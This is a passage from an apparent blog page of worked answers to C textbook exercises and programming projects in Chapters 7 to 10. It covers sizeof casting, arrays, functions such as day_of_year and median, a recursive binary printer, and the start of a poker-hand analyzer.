'B': case 'C': case 'M': case 'P':</span><br><span class="line">        sum += 3; break;</span><br><span class="line">      case 'F': case 'H': case 'V': case 'W': case 'Y':</span><br><span class="line">        sum += 4; break;</span><br><span class="line">      case 'K':</span><br><span class="line">        sum += 5; break;</span><br><span class="line">      case 'J': case 'X':</span><br><span class="line">        sum += 8; break;</span><br><span class="line">      case 'Q': case 'Z':</span><br><span class="line">        sum += 10; break;</span><br><span class="line">      default:</span><br><span class="line">        sum++; break;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">  printf("Scrabble value: %d\n", sum);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #12] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  printf("Size of int: %d\n", (int) sizeof(int));</span><br><span class="line">  printf("Size of short: %d\n", (int) sizeof(short));</span><br><span class="line">  printf("Size of long: %d\n", (int) sizeof(long));</span><br><span class="line">  printf("Size of float: %d\n", (int) sizeof(float));</span><br><span class="line">  printf("Size of double: %d\n", (int) sizeof(double));</span><br><span class="line">  printf("Size of long double: %d\n", (int) sizeof(long double));</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Since the type of a <code>sizeof</code> expression may vary from one implementation to another, it’s necessary in C89 to cast <code>sizeof</code> expressions to a known type before printing them. The sizes of the basic types are small numbers, so it’s safe to cast them to <code>int</code>. (In general, however, it’s best to cast <code>sizeof</code> expressions to <code>unsigned</code> <code>long</code> and print them using <code>%lu</code>.) In C99, we can avoid the cast by using the <code>%zu</code> conversion specification.</p><h3 id="Chapter-8"><a href="#Chapter-8" class="headerlink" title="Chapter 8"></a>Chapter 8</h3><h4 id="Answers-to-Selected-Exercises-3"><a href="#Answers-to-Selected-Exercises-3" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>1.</strong> [was #4] The problem with <code>sizeof(a)</code> <code>/</code> <code>sizeof(</code><em>t</em><code>)</code> is that it can’t easily be checked for correctness by someone reading the program. (The reader would have to locate the declaration of <code>a</code> and make sure that its elements have type <em>t</em>.) </p><p><strong>2.</strong> [was #8] To use a digit <code>d</code> (in character form) as a subscript into the array <code>a</code>, we would write <code>a[d-'0']</code>. This assumes that digits have consecutive codes in the underlying character set, which is true of ASCII and other popular character sets. </p><p><strong>7.</strong> [was #10] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const int segments[10][7] = {{1, 1, 1, 1, 1, 1},</span><br><span class="line">                             {0, 1, 1},</span><br><span class="line">                             {1, 1, 0, 1, 1, 0, 1},</span><br><span class="line">                             {1, 1, 1, 1, 0, 0, 1},</span><br><span class="line">                             {0, 1, 1, 0, 0, 1, 1},</span><br><span class="line">                             {1, 0, 1, 1, 0, 1, 1},</span><br><span class="line">                             {1, 0, 1, 1, 1, 1, 1},</span><br><span class="line">                             {1, 1, 1},</span><br><span class="line">                             {1, 1, 1, 1, 1, 1, 1},</span><br><span class="line">                             {1, 1, 1, 1, 0, 1, 1}};</span><br></pre></td></tr></tbody></table></figure><h4 id="Answers-to-Selected-Programming-Projects-3"><a href="#Answers-to-Selected-Programming-Projects-3" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>2.</strong> [was #2] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int digit_count[10] = {0};</span><br><span class="line">  int digit;</span><br><span class="line">  long n;</span><br><span class="line"> </span><br><span class="line">  printf("Enter a number: ");</span><br><span class="line">  scanf("%ld", &amp;n);</span><br><span class="line"> </span><br><span class="line">  while (n &gt; 0) {</span><br><span class="line">    digit = n % 10;</span><br><span class="line">    digit_count[digit]++;</span><br><span class="line">    n /= 10;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf ("Digit:      ");</span><br><span class="line">  for (digit = 0; digit &lt;= 9; digit++)</span><br><span class="line">    printf("%3d", digit);</span><br><span class="line">  printf("\nOccurrences:");</span><br><span class="line">  for (digit = 0; digit &lt;= 9; digit++)</span><br><span class="line">    printf("%3d", digit_count[digit]);</span><br><span class="line">  printf("\n");</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>5.</strong> [was #6] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">#define NUM_RATES ((int) (sizeof(value) / sizeof(value[0])))</span><br><span class="line">#define INITIAL_BALANCE 100.00</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int i, low_rate, month, num_years, year;</span><br><span class="line">  double value[5];</span><br><span class="line"> </span><br><span class="line">  printf("Enter interest rate: ");</span><br><span class="line">  scanf("%d", &amp;low_rate);</span><br><span class="line">  printf("Enter number of years: ");</span><br><span class="line">  scanf("%d", &amp;num_years);</span><br><span class="line"> </span><br><span class="line">  printf("\nYears");</span><br><span class="line">  for (i = 0; i &lt; NUM_RATES; i++) {</span><br><span class="line">    printf("%6d%%", low_rate + i);</span><br><span class="line">    value[i] = INITIAL_BALANCE;</span><br><span class="line">  }</span><br><span class="line">  printf("\n");</span><br><span class="line"> </span><br><span class="line">  for (year = 1; year &lt;= num_years; year++) {</span><br><span class="line">    printf("%3d    ", year);</span><br><span class="line">    for (i = 0; i &lt; NUM_RATES; i++) {</span><br><span class="line">      for (month = 1; month &lt;= 12; month++)</span><br><span class="line">        value[i] += ((double) (low_rate + i) / 12) / 100.0 * value[i];</span><br><span class="line">      printf("%7.2f", value[i]);</span><br><span class="line">    }</span><br><span class="line">    printf("\n");</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>8.</strong> [was #12] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">#define NUM_QUIZZES  5</span><br><span class="line">#define NUM_STUDENTS 5</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int grades[NUM_STUDENTS][NUM_QUIZZES];</span><br><span class="line">  int high, low, quiz, student, total;</span><br><span class="line"> </span><br><span class="line">  for (student = 0; student &lt; NUM_STUDENTS; student++) {</span><br><span class="line">    printf("Enter grades for student %d: ", student + 1);</span><br><span class="line">    for (quiz = 0; quiz &lt; NUM_QUIZZES; quiz++)</span><br><span class="line">      scanf("%d", &amp;grades[student][quiz]);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("\nStudent  Total  Average\n");</span><br><span class="line">  for (student = 0; student &lt; NUM_STUDENTS; student++) {</span><br><span class="line">    printf("%4d      ", student + 1);</span><br><span class="line">    total = 0;</span><br><span class="line">    for (quiz = 0; quiz &lt; NUM_QUIZZES; quiz++)</span><br><span class="line">      total += grades[student][quiz];</span><br><span class="line">    printf("%3d     %3d\n", total, total / NUM_QUIZZES);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("\nQuiz  Average  High  Low\n");</span><br><span class="line">  for (quiz = 0; quiz &lt; NUM_QUIZZES; quiz++) {</span><br><span class="line">    printf("%3d     ", quiz + 1);</span><br><span class="line">    total = 0;</span><br><span class="line">    high = 0;</span><br><span class="line">    low = 100;</span><br><span class="line">    for (student = 0; student &lt; NUM_STUDENTS; student++) {</span><br><span class="line">      total += grades[student][quiz];</span><br><span class="line">      if (grades[student][quiz] &gt; high)</span><br><span class="line">        high = grades[student][quiz];</span><br><span class="line">      if (grades[student][quiz] &lt; low)</span><br><span class="line">        low = grades[student][quiz];</span><br><span class="line">    }</span><br><span class="line">    printf("%3d    %3d   %3d\n", total / NUM_STUDENTS, high, low);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-9"><a href="#Chapter-9" class="headerlink" title="Chapter 9"></a>Chapter 9</h3><h4 id="Answers-to-Selected-Exercises-4"><a href="#Answers-to-Selected-Exercises-4" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int check(int x, int y, int n)</span><br><span class="line">{</span><br><span class="line">  return (x &gt;= 0 &amp;&amp; x &lt;= n - 1 &amp;&amp; y &gt;= 0 &amp;&amp; y &lt;= n - 1);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>4.</strong> [was #4] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int day_of_year(int month, int day, int year)</span><br><span class="line">{</span><br><span class="line">  int num_days[] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};</span><br><span class="line">  int day_count = 0, i;</span><br><span class="line"> </span><br><span class="line">  for (i = 1; i &lt; month; i++)</span><br><span class="line">    day_count += num_days[i-1];</span><br><span class="line"> </span><br><span class="line">  /* adjust for leap years, assuming they are divisible by 4 */</span><br><span class="line">  if (year % 4 == 0 &amp;&amp; month &gt; 2)</span><br><span class="line">    day_count++;</span><br><span class="line"> </span><br><span class="line">  return day_count + day;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Using the expression <code>year</code> <code>%</code> <code>4</code> <code>==</code> <code>0</code> to test for leap years is not completely correct. Centuries are special cases: if a year is a multiple of 100, then it must also be a multiple of 400 in order to be a leap year. The correct test is </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">year % 4 == 0 &amp;&amp; (year % 100 != 0 || year % 400 == 0)</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #6; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int digit(int n, int k)</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  for (i = 1; i &lt; k; i++)</span><br><span class="line">    n /= 10;</span><br><span class="line"> </span><br><span class="line">  return n % 10;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>8.</strong> [was #8] (a) and (b) are valid prototypes. (c) is illegal, since it doesn’t specify the type of the parameter. (d) incorrectly specifies that <code>f</code> returns an <code>int</code> value in C89; in C99, omitting the return type is illegal. </p><p><strong>10.</strong> [was #10] </p><p>(a)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int largest(int a[], int n)</span><br><span class="line">{</span><br><span class="line">  int i, max = a[0];</span><br><span class="line"> </span><br><span class="line">  for (i = 1; i &lt; n; i++)</span><br><span class="line">    if (a[i] &gt; max)</span><br><span class="line">      max = a[i];</span><br><span class="line"> </span><br><span class="line">  return max;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int average(int a[], int n)</span><br><span class="line">{</span><br><span class="line">  int i, avg = 0;</span><br><span class="line"> </span><br><span class="line">  for (i = 0; i &lt; n; i++)</span><br><span class="line">    avg += a[i];</span><br><span class="line"> </span><br><span class="line">  return avg / n;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(c)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int num_positive(int a[], int n)</span><br><span class="line">{</span><br><span class="line">  int i, count = 0;</span><br><span class="line"> </span><br><span class="line">  for (i = 0; i &lt; n; i++)</span><br><span class="line">    if (a[i] &gt; 0)</span><br><span class="line">      count++;</span><br><span class="line"> </span><br><span class="line">  return count;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>15.</strong> [was #12; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">double median(double x, double y, double z)</span><br><span class="line">{</span><br><span class="line">  double result;</span><br><span class="line"> </span><br><span class="line">  if (x &lt;= y)</span><br><span class="line">    if (y &lt;= z) result = y;</span><br><span class="line">    else if (x &lt;= z) result = z;</span><br><span class="line">    else result = x;</span><br><span class="line">  else {</span><br><span class="line">    if (z &lt;= y) result = y;</span><br><span class="line">    else if (x &lt;= z) result = x;</span><br><span class="line">    else result = z;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>17.</strong> [was #14] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int fact(int n)</span><br><span class="line">{</span><br><span class="line">  int i, result = 1;</span><br><span class="line"> </span><br><span class="line">  for (i = 2; i &lt;= n; i++)</span><br><span class="line">    result *= i;</span><br><span class="line"> </span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>19.</strong> [was #16] The following program tests the <code>pb</code> function: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">void pb(int n);</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int n;</span><br><span class="line"> </span><br><span class="line">  printf("Enter a number: ");</span><br><span class="line">  scanf("%d", &amp;n);</span><br><span class="line"> </span><br><span class="line">  printf("Output of pb: ");</span><br><span class="line">  pb(n);</span><br><span class="line">  printf("\n");</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">void pb(int n)</span><br><span class="line">{</span><br><span class="line">  if (n != 0) {</span><br><span class="line">    pb(n / 2);</span><br><span class="line">    putchar('0' + n % 2);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>pb</code> prints the binary representation of the argument <code>n</code>, assuming that <code>n</code> is greater than 0. (We also assume that digits have consecutive codes in the underlying character set.) For example: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Enter a number: 53</span><br><span class="line">Output of pb: 110101</span><br></pre></td></tr></tbody></table></figure><p>A trace of <code>pb</code>‘s execution would look like this: </p><p><code> pb(53)</code> finds that 53 is not equal to 0, so it calls<br> <code>  pb(26)</code>, which finds that 26 is not equal to 0, so it calls<br> <code>   pb(13)</code>, which finds that 13 is not equal to 0, so it calls<br> <code>    pb(6)</code>, which finds that 6 is not equal to 0, so it calls<br> <code>     pb(3)</code>, which finds that 3 is not equal to 0, so it calls<br> <code>      pb(1)</code>, which finds that 1 is not equal to 0, so it calls<br> <code>       pb(0)</code>, which finds that 0 <em>is</em> equal to 0, so it returns, causing<br> <code>      pb(1)</code> to print <code>1</code> and return, causing<br> <code>     pb(3)</code> to print <code>1</code> and return, causing<br> <code>    pb(6)</code> to print <code>0</code> and return, causing<br> <code>   pb(13)</code> to print <code>1</code> and return, causing<br> <code>  pb(26)</code> to print <code>0</code> and return, causing<br> <code> pb(53)</code> to print <code>1</code> and return. </p><h3 id="Chapter-10"><a href="#Chapter-10" class="headerlink" title="Chapter 10"></a>Chapter 10</h3><h4 id="Answers-to-Selected-Exercises-5"><a href="#Answers-to-Selected-Exercises-5" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>1.</strong> [was #2] (a) <code>a</code>, <code>b</code>, and <code>c</code> are visible.<br> (b) <code>a</code>, and <code>d</code> are visible.<br> (c) <code>a</code>, <code>d</code>, and <code>e</code> are visible.<br> (d) <code>a</code> and <code>f</code> are visible. </p><h4 id="Answers-to-Selected-Programming-Projects-4"><a href="#Answers-to-Selected-Programming-Projects-4" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>3.</strong> [was #4] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdbool.h&gt;   /* C99 only */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">#define NUM_CARDS 5</span><br><span class="line">#define RANK 0</span><br><span class="line">#define SUIT 1</span><br><span class="line"> </span><br><span class="line">/* external variables */</span><br><span class="line">int hand[NUM_CARDS][2];</span><br><span class="line">/*    0    1</span><br><span class="line">    ____ ____</span><br><span class="line"> 0 |____|____|</span><br><span class="line"> 1 |____|____|</span><br><span class="line"> 2 |____|____|</span><br><span class="line"> 3 |____|____|</span><br><span class="line"> 4 |____|____|</span><br><span class="line">    rank suit</span><br><span class="line">*/</span><br><span class="line"> </span><br><span class="line">bool straight, flush, four, three;</span><br><span class="line">int pairs;   /* can be 0, 1, or 2 */</span><br><span class="line"> </span><br><span class="line">/* prototypes */</span><br><span class="line">void read_cards(void);</span><br><span class="line">void analyze_hand(void);</span><br><span class="line">void print_result(void);</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * main: Calls read_cards, analyze_hand, and print_result *</span><br><span class="line"> *       repeatedly.                                      *</span><br><span class="line"> **********************************************************/</span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  for (;;) {</span><br><span class="line">    read_cards();</span><br><span class="line">    analyze_hand();</span><br><span class="line">    print_result();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * read_cards: Reads the cards into the external variable *</span><br><span class="line"> *             hand; checks for bad cards and duplicate   *</span><br><span class="line"> *             cards.                                     *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void read_cards(void)</span><br><span class="line">{</span><br><span class="line">  char ch, rank_ch, suit_ch;</span><br><span class="line">  int i, rank, suit;</span><br><span class="line">  bool bad_card, duplicate_card;</span><br><span class="line">  int cards_read = 0;</span><br><span class="line"> </span><br><span class="line">  while (cards_read &lt; NUM_CARDS) {</span><br><span class="line">    bad_card = false;</span><br><span class="line"> </span><br><span class="line">    printf("Enter a card: ");</span><br><span class="line"> </span><br><span class="line">    rank_ch = getchar();</span><br><span class="line">    switch (rank_ch) {</span><br><span class="line">      case '0':           exit(EXIT_SUCCESS);</span><br><span class="line">      case '2':           rank = 0; break;</span><br><span class="line">      case '3':           rank = 1; break;</span><br><span class="line">      case '4':           rank = 2; break;</span><br><span class="line">      case '5':           rank = 3; break;</span><br><span class="line">      case '6':           rank = 4; break;</span><br><span class="line">      case '7':           rank = 5; break;</span><br><span class="line">      case '8':           rank = 6; break;</span><br><span class="line">      case '9':           rank = 7; break;</span><br><span class="line">      case 't': case 'T': rank = 8; break;</span><br><span class="line">      case 'j': case 'J': rank = 9; break;</span><br><span class="line">      case 'q': case 'Q': rank = 10; break;</span><br><span class="line">      case 'k': case 'K': rank = 11; break;</span><br><span class="line">      case 'a': case 'A': rank = 12; break;</span><br><span class="line">      default:            bad_card = true;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    suit_ch = getchar();</span><br><span class="line">    switch (suit_ch) {</span><br><span class="line">      case 'c': case 'C': suit = 0; break;</span><br><span class="line">      case 'd': case 'D': suit = 1; break;</span><br><span class="line">      case 'h': case 'H': suit = 2; break;</span><br><span class="line">      case 's': case 'S': suit = 3; break;</span><br><span class="line">      default:            bad_card = true;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    while ((ch = getchar()) != '\n')</span><br><span class="line">      if (ch != ' ') bad_card = true;</span><br><span class="line"> </span><br><span class="line">    if (bad_card) {</span><br><span class="line">      printf("Bad card; ignored.\n");</span><br><span class="line">      continue;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    duplicate_card = false;</span><br><span class="line">    for (i = 